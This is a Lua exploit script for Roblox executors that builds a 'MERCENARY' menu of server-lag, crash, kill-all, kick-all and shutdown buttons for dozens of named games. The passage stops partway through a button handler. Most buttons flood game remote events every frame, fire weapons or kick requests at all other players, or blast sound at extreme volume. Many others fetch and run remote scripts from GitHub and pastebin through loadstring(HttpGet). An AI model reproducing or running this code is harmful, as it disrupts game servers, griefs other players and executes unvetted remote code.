local CoreGuiService = game:GetService("CoreGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")

local guiParent
if CoreGuiService then
    guiParent = CoreGuiService
else
    guiParent = Players.LocalPlayer:WaitForChild("PlayerGui")
end

local FRAME_BG       = Color3.fromRGB(10, 10, 12)
local SCROLL_BG      = Color3.fromRGB(18, 18, 22)
local BUTTON_BG      = Color3.fromRGB(28, 28, 34)
local BUTTON_HOVER   = Color3.fromRGB(42, 42, 50)
local BUTTON_PRESS   = Color3.fromRGB(58, 10, 10)
local NAV_BG         = Color3.fromRGB(28, 28, 34)
local NAV_HOVER      = Color3.fromRGB(42, 42, 50)
local NAV_PRESS      = Color3.fromRGB(58, 10, 10)
local ACCENT         = Color3.fromRGB(193, 18, 31)
local ACCENT_DIM     = Color3.fromRGB(120, 12, 20)
local TEXT_WHITE     = Color3.fromRGB(240, 240, 245)
local TEXT_GRAY      = Color3.fromRGB(150, 150, 160)
local TEXT_ACCENT    = Color3.fromRGB(220, 40, 50)
local TAB_INDICATOR_COLOR = Color3.fromRGB(193, 18, 31)

local LEFT_IMG_URL = "https://cdn.discordapp.com/attachments/1546040508785098795/1547499998839574568/Picsart_26-09-09_23-52-05-602.jpg?ex=6aa3a52e&is=6aa253ae&hm=60d1dabb9c3a7187854092c8aacc193bece3c7f5e97aeac28731a0a8c8c75ed7&"
local RIGHT_IMG_URL = "https://cdn.discordapp.com/attachments/1546040508785098795/1547499998520934460/Picsart_26-09-09_23-50-31-347.jpg?ex=6aa3a52e&is=6aa253ae&hm=b52787f52d009aa464f015013dc64a6549384d0a24a57eaa527a38cfbe2e252e&"

local leftBgAssetId = nil
local rightBgAssetId = nil

local function loadBgImage(url, name)
    local response = request({Url = url, Method = "GET"})
    if response.StatusCode ~= 200 then
        warn("Failed to load image: " .. name)
        return nil
    end
    local fileName = "tab4_" .. name .. "_" .. os.time() .. ".jpg"
    writefile(fileName, response.Body)
    local assetId = getcustomasset(fileName)
    delfile(fileName)
    return assetId
end

leftBgAssetId = loadBgImage(LEFT_IMG_URL, "left")
rightBgAssetId = loadBgImage(RIGHT_IMG_URL, "right")
task.wait(0.5)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = guiParent
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = FRAME_BG
Frame.BackgroundTransparency = 0
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.0547, 112, 0.3365, -146.3)
Frame.Size = UDim2.new(0, 291.2, 0, 388.5)
Frame.Active = true

local topAccent = Instance.new("Frame")
topAccent.Name = "TopAccent"
topAccent.Parent = Frame
topAccent.BackgroundColor3 = ACCENT
topAccent.BorderSizePixel = 0
topAccent.Position = UDim2.new(0, 0, 0, 0)
topAccent.Size = UDim2.new(1, 0, 0, 2)
topAccent.ZIndex = 5

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "MainScrollingFrame"
ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = SCROLL_BG
ScrollingFrame.BackgroundTransparency = 0
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0126, 0, 0.110, 0)
ScrollingFrame.Size = UDim2.new(0, 282.8, 0, 338.8)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ScrollBarThickness = 2
ScrollingFrame.ScrollBarImageColor3 = ACCENT
ScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y
ScrollingFrame.ClipsDescendants = true

local clickSound = Instance.new("Sound")
clickSound.SoundId = "rbxassetid://6895079853"
clickSound.Volume = 0.5
clickSound.Parent = ScreenGui

local scrollSound = Instance.new("Sound")
scrollSound.SoundId = "rbxassetid://6895079853"
scrollSound.Volume = 0.3
scrollSound.Parent = ScreenGui

local function Dragify(frame)
    local dragging, dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            dragInput = input
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)

    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then update(input) end
    end)
end

Dragify(Frame)

local ts = TweenService
local CoreGui = CoreGuiService
local player = Players.LocalPlayer

local function createButton(name, text, x, y)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Parent = ScrollingFrame
    btn.BackgroundColor3 = BUTTON_BG
    btn.BorderSizePixel = 0
    btn.Position = UDim2.new(0, x, 0, y)
    btn.Size = UDim2.new(0, 126, 0, 26.6)
    btn.Font = Enum.Font.GothamSemibold
    btn.Text = text
    btn.TextColor3 = TEXT_WHITE
    btn.TextSize = 14
    btn.AutoButtonColor = false
    btn.ZIndex = 2
    local strip = Instance.new("Frame")
    strip.Name = "AccentStrip"
    strip.Parent = btn
    strip.BackgroundColor3 = ACCENT
    strip.BorderSizePixel = 0
    strip.Position = UDim2.new(0, 0, 0, 0)
    strip.Size = UDim2.new(0, 2, 1, 0)
    strip.ZIndex = 3
    return btn
end

local function createDescription(text, x, y, textSize)
    local desc = Instance.new("TextLabel")
    desc.Parent = ScrollingFrame
    desc.BackgroundTransparency = 1
    desc.Position = UDim2.new(0, x, 0, y)
    desc.Size = UDim2.new(0, 126, 0, 26.6)
    desc.Font = Enum.Font.Gotham
    desc.Text = text
    desc.TextColor3 = TEXT_GRAY
    desc.TextSize = textSize or 12.6
    desc.TextXAlignment = Enum.TextXAlignment.Left
    desc.ZIndex = 2
    return desc
end

local buttonList = {}
local descriptionList = {}
local tab4List = {}

local currentTab = 1
local totalTabs = 4
local lastScrollPosition = 0

ScrollingFrame:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
    if currentTab == 4 then
        ScrollingFrame.CanvasPosition = Vector2.new(0, 0)
        return
    end
    local currentPos = ScrollingFrame.CanvasPosition.Y
    if math.abs(currentPos - lastScrollPosition) > 5 then
        lastScrollPosition = currentPos
        local newSound = scrollSound:Clone()
        newSound.Parent = ScreenGui
        newSound:Play()
        game:GetService("Debris"):AddItem(newSound, 1)
    end
end)

local function clearButtons()
    for _, btn in ipairs(buttonList) do btn:Destroy() end
    for _, desc in ipairs(descriptionList) do desc:Destroy() end
    for _, item in ipairs(tab4List) do item:Destroy() end
    buttonList = {}
    descriptionList = {}
    tab4List = {}
end

local function playClickSound()
    local newSound = clickSound:Clone()
    newSound.Parent = ScreenGui
    newSound:Play()
    game:GetService("Debris"):AddItem(newSound, 1)
end

local function slapBattlesCrash()
    if game.PlaceId == 6403373529 then
        ReplicatedStorage.Events.Wheelchair:FireServer("add_wheelchair")
        ReplicatedStorage.Events.pinwheel:FireServer()
        local char = player.Character
        if char then
            if char:FindFirstChild("wheel_chair") then char.wheel_chair:Destroy() end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if hrp then
                local pin = hrp:FindFirstChild("pinwheel_model")
                if pin then pin:Destroy() end
            end
        end
        local ability = ReplicatedStorage:FindFirstChild("GeneralAbilityUnreliable")
        if ability then ability:FireServer("start") end
    end
end

local function notifyNoob(msg)
    pcall(function()
        StarterGui:SetCore("SendNotification", { Title = "MERCENARY", Text = msg, Duration = 7 })
    end)
end

local function watchPlayer(plr)
    plr.CharacterAdded:Connect(function(char)
        notifyNoob(plr.Name .. " RESPAWNED")
        local hum = char:WaitForChild("Humanoid", 5)
        if hum then hum.Died:Connect(function() notifyNoob(plr.Name .. " DIED") end) end
    end)
    if plr.Character then
        local hum = plr.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum.Died:Connect(function() notifyNoob(plr.Name .. " DIED") end) end
    end
end

local function kickAllWithRemote(remoteName)
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer
    local remote
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name == remoteName then remote = v break end
    end
    if not remote then warn(remoteName .. " remote not found") return end
    for _, plr in ipairs(players:GetPlayers()) do
        if plr ~= localPlayer then remote:FireServer(plr) end
    end
end

local SNAPPLE_CMD_URL = "https://raw.githubusercontent.com/krynlith/3993urhw292w8d929issjq110110/refs/heads/main/CmdSnappleOwner.com.lua"
local function executeSnappleCMD() loadstring(game:HttpGet(SNAPPLE_CMD_URL))() end

local function prisonLifeLagger()
    local Player = game.Players.LocalPlayer
    local shootEvent
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name == "ShootEvent" then shootEvent = v break end
    end
    if not shootEvent then warn("ShootEvent not found") return end
    local function getGun()
        local char = Player.Character
        if not char then return nil end
        return char:FindFirstChildOfClass("Tool")
    end
    local GunTool = getGun()
    if not GunTool then warn("No tool equipped - equip a gun first") end
    local function FireGun(target)
        coroutine.resume(coroutine.create(function()
            local bulletTable = {}
            table.insert(bulletTable, {
                Hit = target, Distance = 100,
                Cframe = CFrame.new(0, 1, 1),
                RayObject = Ray.new(Vector3.new(0.1, 0.2), Vector3.new(0.3, 0.4))
            })
            shootEvent:FireServer(bulletTable, GunTool or getGun())
        end))
    end
    game:GetService("RunService").Stepped:Connect(function()
        local gun = GunTool or getGun()
        if not gun then return end
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr == Player then continue end
            local char = plr.Character
            if not char then continue end
            local tHum = char:FindFirstChildOfClass("Humanoid")
            if not tHum or tHum.Health <= 0 then continue end
            for i = 1, 50 do FireGun(char) end
        end
    end)
end

local function sprunki3DRPCrash()
    game:GetService("RunService").RenderStepped:Connect(function()
        for i = 1, 50 do
            game:GetService("ReplicatedStorage"):WaitForChild("ChangeCharacterEvent"):FireServer("Gray")
            game:GetService("ReplicatedStorage"):WaitForChild("ChangeCharacterEvent"):FireServer("Wenda")
        end
    end)
end

local function poppyPlaytime6Lag()
    game:GetService("RunService").RenderStepped:Connect(function()
        for i = 1, 50 do
            local morphs = {"Dogday","PJPugaPillar","Bunzo","MommyLongLegs","Kissy","HuggyWuggy"}
            for _, morph in ipairs(morphs) do
                game:GetService("ReplicatedStorage"):WaitForChild("MorphEvent"):FireServer(morph)
            end
        end
    end)
end

local function brokenBonesIVLag()
    local RS = game:GetService("RunService")
    local remote = game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("LoadCharacter")
    for i = 1, 50 do RS.RenderStepped:Connect(function() remote:InvokeServer() end) end
end

local function dogPoundLag()
    local RS = game:GetService("RunService")
    local remote = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvents"):WaitForChild("Miscs"):WaitForChild("JoinTeam")
    RS.RenderStepped:Connect(function()
        for i = 1, 50 do remote:FireServer("Dogs") end
    end)
end

local function dominoEngineLag()
    local RS = game:GetService("RunService")
    local PlaceDomino = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Events"):WaitForChild("PlaceDomino")
    RS.RenderStepped:Connect(function()
        for i = 1, 50 do
            PlaceDomino:FireServer("Domino", CFrame.new(64, 4, 7.16))
        end
    end)
end

local function scpRoleplayLag()
    local RS = game:GetService("RunService")
    local SpawnRemote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Spawn")
    RS.RenderStepped:Connect(function()
        for i = 1, 50 do SpawnRemote:InvokeServer({"Security Department",0,0,false,true},false,false) end
    end)
end

local function flagWarsLag()
    local RS = game:GetService("RunService")
    local SelectTeam = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SelectTeam")
    RS.RenderStepped:Connect(function()
        for i = 1, 50 do SelectTeam:InvokeServer("Team Red") end
        for i = 1, 50 do SelectTeam:InvokeServer("Team Blue") end
    end)
end

local function rocketRumbleLag()
    local RS = game:GetService("RunService")
    local Death = game:GetService("ReplicatedStorage"):WaitForChild("Gameplay"):WaitForChild("Remotes"):WaitForChild("Death")
    RS.RenderStepped:Connect(function() for i = 1, 50 do Death:FireServer() end end)
end

local function loadTab4()
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 338.8)
    ScrollingFrame.ScrollingEnabled = false
    ScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
    ScrollingFrame.CanvasPosition = Vector2.new(0, 0)

    local frozenLabel = Instance.new("TextLabel")
    frozenLabel.Name = "FrozenLabel"
    frozenLabel.Parent = ScrollingFrame
    frozenLabel.BackgroundTransparency = 1
    frozenLabel.Position = UDim2.new(0, 0, 0, 0)
    frozenLabel.Size = UDim2.new(1, 0, 1, 0)
    frozenLabel.Font = Enum.Font.GothamBold
    frozenLabel.Text = "MERCENARY"
    frozenLabel.TextColor3 = ACCENT
    frozenLabel.TextTransparency = 0.82
    frozenLabel.TextSize = 52
    frozenLabel.ZIndex = 1
    table.insert(tab4List, frozenLabel)

    local leftImage = Instance.new("ImageLabel")
    leftImage.Name = "LeftImage"
    leftImage.Parent = ScrollingFrame
    leftImage.BackgroundTransparency = 1
    leftImage.Position = UDim2.new(0, 10, 0, 30)
    leftImage.Size = UDim2.new(0, 120, 0, 120)
    leftImage.Image = leftBgAssetId or ""
    leftImage.ScaleType = Enum.ScaleType.Fit
    leftImage.ZIndex = 3
    table.insert(tab4List, leftImage)

    local leftArrow = Instance.new("TextLabel")
    leftArrow.Parent = ScrollingFrame
    leftArrow.BackgroundTransparency = 1
    leftArrow.Position = UDim2.new(0, 10, 0, 155)
    leftArrow.Size = UDim2.new(0, 120, 0, 40)
    leftArrow.Font = Enum.Font.GothamBold
    leftArrow.Text = "▲"
    leftArrow.TextColor3 = ACCENT
    leftArrow.TextSize = 40
    leftArrow.ZIndex = 3
    table.insert(tab4List, leftArrow)

    local leftText = Instance.new("TextLabel")
    leftText.Parent = ScrollingFrame
    leftText.BackgroundTransparency = 1
    leftText.Position = UDim2.new(0, 10, 0, 200)
    leftText.Size = UDim2.new(0, 120, 0, 40)
    leftText.Font = Enum.Font.GothamBold
    leftText.Text = "Snapple"
    leftText.TextColor3 = TEXT_WHITE
    leftText.TextSize = 24
    leftText.ZIndex = 3
    table.insert(tab4List, leftText)

    local leftButton = Instance.new("TextButton")
    leftButton.Parent = ScrollingFrame
    leftButton.BackgroundColor3 = BUTTON_BG
    leftButton.BorderSizePixel = 0
    leftButton.Position = UDim2.new(0, 10, 0, 245)
    leftButton.Size = UDim2.new(0, 120, 0, 30)
    leftButton.Font = Enum.Font.GothamBold
    leftButton.Text = "SERVER LAG"
    leftButton.TextColor3 = TEXT_WHITE
    leftButton.TextSize = 14
    leftButton.AutoButtonColor = false
    leftButton.ZIndex = 3
    local lstrip = Instance.new("Frame")
    lstrip.Parent = leftButton
    lstrip.BackgroundColor3 = ACCENT
    lstrip.BorderSizePixel = 0
    lstrip.Size = UDim2.new(0, 2, 1, 0)
    lstrip.ZIndex = 4
    table.insert(tab4List, leftButton)

    local leftDesc = Instance.new("TextLabel")
    leftDesc.Parent = ScrollingFrame
    leftDesc.BackgroundTransparency = 1
    leftDesc.Position = UDim2.new(0, 10, 0, 280)
    leftDesc.Size = UDim2.new(0, 120, 0, 50)
    leftDesc.Font = Enum.Font.Gotham
    leftDesc.Text = "-- Prison Life Lagger Requires Remington gun."
    leftDesc.TextColor3 = TEXT_GRAY
    leftDesc.TextSize = 8
    leftDesc.TextWrapped = true
    leftDesc.TextXAlignment = Enum.TextXAlignment.Left
    leftDesc.TextYAlignment = Enum.TextYAlignment.Top
    leftDesc.ZIndex = 3
    table.insert(tab4List, leftDesc)

    local rightImage = Instance.new("ImageLabel")
    rightImage.Parent = ScrollingFrame
    rightImage.BackgroundTransparency = 1
    rightImage.Position = UDim2.new(1, -130, 0, 30)
    rightImage.Size = UDim2.new(0, 120, 0, 120)
    rightImage.Image = rightBgAssetId or ""
    rightImage.ScaleType = Enum.ScaleType.Fit
    rightImage.ZIndex = 3
    table.insert(tab4List, rightImage)

    local rightArrow = Instance.new("TextLabel")
    rightArrow.Parent = ScrollingFrame
    rightArrow.BackgroundTransparency = 1
    rightArrow.Position = UDim2.new(1, -130, 0, 155)
    rightArrow.Size = UDim2.new(0, 120, 0, 40)
    rightArrow.Font = Enum.Font.GothamBold
    rightArrow.Text = "▲"
    rightArrow.TextColor3 = ACCENT
    rightArrow.TextSize = 40
    rightArrow.ZIndex = 3
    table.insert(tab4List, rightArrow)

    local rightText = Instance.new("TextLabel")
    rightText.Parent = ScrollingFrame
    rightText.BackgroundTransparency = 1
    rightText.Position = UDim2.new(1, -130, 0, 200)
    rightText.Size = UDim2.new(0, 120, 0, 40)
    rightText.Font = Enum.Font.GothamBold
    rightText.Text = "Safari"
    rightText.TextColor3 = TEXT_WHITE
    rightText.TextSize = 24
    rightText.ZIndex = 3
    table.insert(tab4List, rightText)

    local rightButton = Instance.new("TextButton")
    rightButton.Parent = ScrollingFrame
    rightButton.BackgroundColor3 = BUTTON_BG
    rightButton.BorderSizePixel = 0
    rightButton.Position = UDim2.new(1, -130, 0, 245)
    rightButton.Size = UDim2.new(0, 120, 0, 30)
    rightButton.Font = Enum.Font.GothamBold
    rightButton.Text = "REWIND GUI"
    rightButton.TextColor3 = TEXT_WHITE
    rightButton.TextSize = 14
    rightButton.AutoButtonColor = false
    rightButton.ZIndex = 3
    local rstrip = Instance.new("Frame")
    rstrip.Parent = rightButton
    rstrip.BackgroundColor3 = ACCENT
    rstrip.BorderSizePixel = 0
    rstrip.Size = UDim2.new(0, 2, 1, 0)
    rstrip.ZIndex = 4
    table.insert(tab4List, rightButton)

    local rightDesc = Instance.new("TextLabel")
    rightDesc.Parent = ScrollingFrame
    rightDesc.BackgroundTransparency = 1
    rightDesc.Position = UDim2.new(1, -130, 0, 280)
    rightDesc.Size = UDim2.new(0, 120, 0, 50)
    rightDesc.Font = Enum.Font.Gotham
    rightDesc.Text = "-- Simple Universal Rewind GUI."
    rightDesc.TextColor3 = TEXT_GRAY
    rightDesc.TextSize = 8
    rightDesc.TextWrapped = true
    rightDesc.TextXAlignment = Enum.TextXAlignment.Left
    rightDesc.TextYAlignment = Enum.TextYAlignment.Top
    rightDesc.ZIndex = 3
    table.insert(tab4List, rightDesc)

    leftButton.MouseEnter:Connect(function() ts:Create(leftButton, TweenInfo.new(0.12), {BackgroundColor3 = BUTTON_HOVER}):Play() end)
    leftButton.MouseButton1Down:Connect(function() ts:Create(leftButton, TweenInfo.new(0.07), {BackgroundColor3 = BUTTON_PRESS}):Play() playClickSound() end)
    leftButton.MouseButton1Up:Connect(function() ts:Create(leftButton, TweenInfo.new(0.09), {BackgroundColor3 = BUTTON_HOVER}):Play() end)
    leftButton.MouseLeave:Connect(function() ts:Create(leftButton, TweenInfo.new(0.12), {BackgroundColor3 = BUTTON_BG}):Play() end)
    leftButton.MouseButton1Click:Connect(function()
        pcall(function() prisonLifeLagger() end)
    end)

    rightButton.MouseEnter:Connect(function() ts:Create(rightButton, TweenInfo.new(0.12), {BackgroundColor3 = BUTTON_HOVER}):Play() end)
    rightButton.MouseButton1Down:Connect(function() ts:Create(rightButton, TweenInfo.new(0.07), {BackgroundColor3 = BUTTON_PRESS}):Play() playClickSound() end)
    rightButton.MouseButton1Up:Connect(function() ts:Create(rightButton, TweenInfo.new(0.09), {BackgroundColor3 = BUTTON_HOVER}):Play() end)
    rightButton.MouseLeave:Connect(function() ts:Create(rightButton, TweenInfo.new(0.12), {BackgroundColor3 = BUTTON_BG}):Play() end)
    rightButton.MouseButton1Click:Connect(function()
        pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/8hi9aPBX"))() end)
    end)
end

local function loadTab(tabNumber)
    clearButtons()

    if tabNumber == 4 then
        loadTab4()
        return
    end

    ScrollingFrame.ScrollingEnabled = true
    ScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y

    local buttonOrder = {}
    if tabNumber == 1 then
        for i = 1, 11 do table.insert(buttonOrder, i) end
        for i = 34, 43 do table.insert(buttonOrder, i) end
    elseif tabNumber == 2 then
        for i = 12, 22 do table.insert(buttonOrder, i) end
        for i = 44, 53 do table.insert(buttonOrder, i) end
    elseif tabNumber == 3 then
        for i = 23, 33 do table.insert(buttonOrder, i) end
        for i = 54, 58 do table.insert(buttonOrder, i) end
    end

    local totalButtons = #buttonOrder
    local contentHeight = 7 + (totalButtons * 33.6) + 7
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, contentHeight)

    for idx, i in ipairs(buttonOrder) do
        local yPos = 7 + ((idx - 1) * 33.6)

        local btnText = "BTN" .. i
        if i >= 1 and i <= 11 then btnText = "LAG SERVER"
        elseif i == 12 then btnText = "SOUND"
        elseif i == 13 then btnText = "KILL ALL"
        elseif i == 14 then btnText = "KILL ALL"
        elseif i == 15 then btnText = "NOOB ALL"
        elseif i == 16 then btnText = "NOOB ALL"
        elseif i == 17 then btnText = "SHUTDOWN"
        elseif i == 18 then btnText = "SHUTDOWN"
        elseif i == 19 then btnText = "HAX GUI"
        elseif i == 20 then btnText = "HAX GUI V2"
        elseif i == 21 then btnText = "MAP DELETE/CRASH"
        elseif i == 22 then btnText = "CRASH"
        elseif i == 23 then btnText = "KICK ALL"
        elseif i == 24 then btnText = "KICK ALL"
        elseif i == 25 then btnText = "KICK ALL"
        elseif i == 26 then btnText = "KICK ALL"
        elseif i == 27 then btnText = "KICK ALL"
        elseif i >= 28 and i <= 33 then btnText = "SNAPPLECMD"
        elseif i >= 34 and i <= 43 then btnText = "LAG SERVER"
        elseif i == 44 then btnText = "CRASH"
        elseif i == 45 then btnText = "CRASH"
        else btnText = "BTN" .. i end

        local btn = createButton("BTN" .. i, btnText, 7, yPos)
        table.insert(buttonList, btn)

        local descText, descSize
        if i == 1 then descText, descSize = "-- ADVANCED EUPHORIA RAGDOLL", 9.8
        elseif i == 2 then descText, descSize = "-- Blob Eating Simulator", 9.9
        elseif i == 3 then descText, descSize = "-- [FPS] FLICK", 12
        elseif i == 4 then descText, descSize = "-- Blox Mod", 12
        elseif i == 5 then descText, descSize = "-- construction", 9.4
        elseif i == 6 then descText, descSize = "-- SLAP BATTLES", 9.4
        elseif i == 7 then descText, descSize = "-- Dig and Hatch a Brainrot", 9.4
        elseif i == 8 then descText, descSize = "-- Village vs Zombies", 10
        elseif i == 9 then descText, descSize = "-- Forsaken RP", 9.4
        elseif i == 10 then descText, descSize = "-- Deadly Indian Truck Driving", 9.4
        elseif i == 11 then descText, descSize = "-- Drive the train to the end.", 9.4
        elseif i == 12 then descText, descSize = "-- Shoot and Eat RETROs", 10
        elseif i == 13 then descText, descSize = "-- Ragdoll Physics [SKYDIVING]", 9.4
        elseif i == 14 then descText, descSize = "-- Zombie Lab", 9.4
        elseif i == 15 then descText, descSize = "-- Natural Disaster Survival", 9.4
        elseif i == 16 then descText, descSize = "-- Rob The Mother!", 12
        elseif i == 17 then descText, descSize = "-- Build A Boat For Treasure", 9.4
        elseif i == 18 then descText, descSize = "-- Be a Lucky Block", 12
        elseif i == 19 then descText, descSize = "-- Nightmare Troll Slap Tower", 9.4
        elseif i == 20 then descText, descSize = "-- Find ay mi gatito Tower", 9.4
        elseif i == 21 then descText, descSize = "-- Tornado Sandbox Game", 9.4
        elseif i == 22 then descText, descSize = "-- Supermarket Together", 12
        elseif i == 23 then descText, descSize = "-- Benefit Street", 12
        elseif i == 24 then descText, descSize = "-- Super Toilet Roleplay", 12
        elseif i == 25 then descText, descSize = "-- [FREE ADMIN] Which logo quiz is correct?", 8
        elseif i == 26 then descText, descSize = "-- Fish Store Tycoon", 12
        elseif i == 27 then descText, descSize = "-- Helicopter testing", 9.4
        elseif i == 28 then descText, descSize = "-- Quarantine Border [HORROR]", 9.4
        elseif i == 29 then descText, descSize = "-- Monster Trucks Game", 8.4
        elseif i == 30 then descText, descSize = "-- Build a copter", 12
        elseif i == 31 then descText, descSize = "-- Zombie Base Attack", 12
        elseif i == 32 then descText, descSize = "-- Zombie Takedown", 12
        elseif i == 33 then descText, descSize = "-- A-10 STRIKE Destroy the CITY", 6
        elseif i == 34 then descText, descSize = "-- Poppy Playtime 6 Roleplay City", 8
        elseif i == 35 then descText, descSize = "-- Build To Survive DISASTERS!", 9.4
        elseif i == 36 then descText, descSize = "-- ASMR Sandbox", 9.4
        elseif i == 37 then descText, descSize = "-- Broken Bones IV", 9.4
        elseif i == 38 then descText, descSize = "-- Dog Pound", 9.4
        elseif i == 39 then descText, descSize = "-- Domino Engine", 9.4
        elseif i == 40 then descText, descSize = "-- (AI) Cops and Robbers", 9.4
        elseif i == 41 then descText, descSize = "-- SCP: Roleplay", 9.4
        elseif i == 42 then descText, descSize = "-- Flag Wars!", 9.4
        elseif i == 43 then descText, descSize = "-- Rocket Rumble", 9.4
        elseif i == 44 then descText, descSize = "-- Sprunki 3D RP!", 9.4
        elseif i == 45 then descText, descSize = "-- Sprunki Roleplay", 9.4
        else descText, descSize = "-- placeholder", 9.4 end

        local desc = createDescription(descText, 140, yPos, descSize)
        table.insert(descriptionList, desc)
    end

    for _, btn in ipairs(buttonList) do
        btn.MouseEnter:Connect(function() ts:Create(btn, TweenInfo.new(0.12), {BackgroundColor3 = BUTTON_HOVER}):Play() end)
        btn.MouseButton1Down:Connect(function() ts:Create(btn, TweenInfo.new(0.07), {BackgroundColor3 = BUTTON_PRESS}):Play() playClickSound() end)
        btn.MouseButton1Up:Connect(function() ts:Create(btn, TweenInfo.new(0.09), {BackgroundColor3 = BUTTON_HOVER}):Play() end)
        btn.MouseLeave:Connect(function() ts:Create(btn, TweenInfo.new(0.12), {BackgroundColor3 = BUTTON_BG}):Play() end)
        btn.TouchTap:Connect(function()
            ts:Create(btn, TweenInfo.new(0.07), {BackgroundColor3 = BUTTON_PRESS}):Play()
            playClickSound()
            task.wait(0.12)
            ts:Create(btn, TweenInfo.new(0.09), {BackgroundColor3 = BUTTON_BG}):Play()
        end)

        if btn.Name == "BTN1" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/RAKNETSOURCE/AER.lua"))() end) end)
        elseif btn.Name == "BTN2" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/RAKNETSOURCE/BES.lua"))() end) end)
        elseif btn.Name == "BTN3" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/FlickSnapple/refs/heads/main/SnappleLaggerFlick"))() end) end)
        elseif btn.Name == "BTN4" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/RAKNETSOURCE/BM.lua"))() end) end)
        elseif btn.Name == "BTN5" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    RunService.RenderStepped:Connect(function()
                        for _, v in ipairs(workspace:GetDescendants()) do
                            if v:IsA("ClickDetector") then fireclickdetector(v) end
                        end
                    end)
                end)
            end)
        elseif btn.Name == "BTN6" then
            btn.MouseButton1Click:Connect(function() pcall(function() task.spawn(function() while true do task.wait() slapBattlesCrash() end end) end) end)
        elseif btn.Name == "BTN7" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/RAKNETSOURCE/DAHAB.lua"))() end) end)
        elseif btn.Name == "BTN8" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/RAKNETSOURCE/VVZ.lua"))() end) end)
        elseif btn.Name == "BTN9" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/RAKNETSOURCE/FR.lua"))() end) end)
        elseif btn.Name == "BTN10" then
            btn.MouseButton1Click:Connect(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Snapplemoon/Betterlib/refs/heads/main/DITD.lua"))() end) end)
        elseif btn.Name == "BTN11" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    RunService.RenderStepped:Connect(function()
                        for _, v in ipairs(workspace:GetDescendants()) do
                            if v:IsA("ClickDetector") then fireclickdetector(v) end
                        end
                    end)
                end)
            end)
        elseif btn.Name == "BTN12" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    local args = { "rbxassetid://7138435646", { PlaybackSpeed = 1, TimePosition = 0.12, Volume = 9999999 }, vector.create(31.4, -40, -21.3) }
                    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("PlayGlobalSound"):FireServer(unpack(args))
                end)
            end)
        elseif btn.Name == "BTN13" then
            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    for d = 1, 5 do
                        task.wait(0.1)
                        for _, v in pairs(game.Players:GetPlayers()) do
                            if v ~= game.Players.LocalPlayer and v.Character:FindFirstChild("RightLowerLeg") then
